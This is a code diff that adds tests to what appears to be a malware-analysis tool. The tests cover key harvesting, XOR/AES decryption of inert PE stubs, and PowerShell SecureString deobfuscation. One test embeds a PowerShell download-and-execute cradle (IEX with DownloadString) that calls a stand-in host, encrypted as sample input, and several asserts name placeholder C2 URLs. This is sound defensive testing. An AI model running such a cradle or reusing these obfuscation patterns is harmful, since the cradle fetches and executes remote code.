@@ -416,3 +416,62 @@ def test_encoded_blobs_sample_end_to_end(client) -> None:
     assert kids["bin"]["entropy"] > 7 and kids["exe"]["kind"] == "binary"
     iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
     assert "http://billing-portal.example/inv/c2" in iocs
+
+
+def _aes(key: bytes, iv: bytes, data: bytes, ecb: bool = False) -> bytes:
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    pad = 16 - len(data) % 16
+    return Cipher(algorithms.AES(key), modes.ECB() if ecb else modes.CBC(iv)).encryptor().update(data + bytes([pad]) * pad)
+
+
+_PE = (b"MZ" + b"\x90" * 58 + (0x80).to_bytes(4, "little") + b"\x00" * 64
+       + b"This program cannot be run in DOS mode. inert stub " * 8)
+
+
+def test_key_trials_xor_and_aes() -> None:
+    from docutracex import decrypted as d
+    key, iv = bytes(range(32)), bytes(range(100, 116))
+    keys = d.harvest_keys("[byte[]]$k=@(" + ",".join(map(str, key)) + ")\n$iv=@(" + ",".join(map(str, iv))
+                          + ")\n$p='Fact2024'")
+    assert d.classify(d._xor(_PE, b"\x5a"), "t", "o", keys={})["recipe"] == ["xor(0x5a)", "exe"]
+    assert d.classify(d._xor(_PE, b"Fact2024"), "t", "o", keys=keys)["recipe"][-1] == "exe"
+    assert d.classify(_aes(key, iv, _PE), "t", "o", keys=keys)["recipe"][0].startswith("aes-256-cbc")
+    assert d.classify(iv + _aes(key, iv, _PE), "t", "o", keys={"arrays": [key], "strings": []})["recipe"][-1] == "exe"
+    assert d.classify(_aes(key, iv, _PE, ecb=True), "t", "o", keys=keys)["recipe"][0].startswith("aes-256-ecb")
+
+
+def test_key_trials_no_false_positives() -> None:
+    import random
+    from docutracex import decrypted as d
+    keys = d.harvest_keys("$k=@(" + ",".join(map(str, range(32))) + ")\n$iv=@(" + ",".join(map(str, range(16))) + ")")
+    rnd = random.Random(11)
+    for _ in range(150):
+        for n in (48, 300, 900):
+            r = d.classify(bytes(rnd.randrange(256) for _ in range(n)), "t", "o", keys=keys)
+            assert r is None or r["recipe"][-1] == "opaque"
+
+
+def test_securestring_decrypted_in_place() -> None:
+    import base64
+    from docutracex.parsers import ps_deobf
+    iv = bytes(range(16))
+    plain = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/ss.ps1')"
+    inner = f"2|{base64.b64encode(iv).decode()}|{_aes(bytes(range(1, 33)), iv, plain.encode('utf-16-le')).hex()}"
+    blob = "76492d1116743f0423413b16050a5345" + base64.b64encode(inner.encode("utf-16-le")).decode()
+    for code in (f"$e='{blob}'\n$ss = ConvertTo-SecureString $e -Key (1..32)",
+                 f"$k=[byte[]](" + ",".join(map(str, range(1, 33))) + f")\n$ss = '{blob}' | ConvertTo-SecureString -Key $k",
+                 f"$ss = ConvertTo-SecureString -String '{blob}' -Key @(" + ",".join(map(str, range(1, 33))) + ")"):
+        r = ps_deobf.deobfuscate(code)
+        assert "securestring" in r["methods"] and "billing-portal.example/ss.ps1" in r["code"]
+
+
+def test_crypto_loader_sample_end_to_end(client) -> None:
+    import json
+    _, res = _analyze(client, "sample_crypto_loader.ps1", _ms().crypto_loader_ps1())
+    recipes = {tuple(n.get("recipe") or []) for n in _tree(res)}
+    assert ("base64", "xor(0x5a)", "exe") in recipes
+    assert any(r[1].startswith("aes-256-cbc") and r[-2:] == ("gzip", "text") for r in recipes if len(r) >= 3)
+    ps = json.loads((res / "powershell.json").read_text())["scripts"][0]
+    assert "securestring" in ps["deob_methods"]
+    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
+    assert {"http://billing-portal.example/inv/aes-c2", "http://billing-portal.example/inv/ss-stage.ps1"} <= iocs
